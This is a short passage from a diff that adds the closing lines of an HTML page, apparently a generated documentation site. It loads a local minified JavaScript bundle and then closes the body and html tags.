+      <script src="../../../assets/javascripts/bundle.82b56eb2.min.js"></script>
+      
+    
+  </body>
+</html>
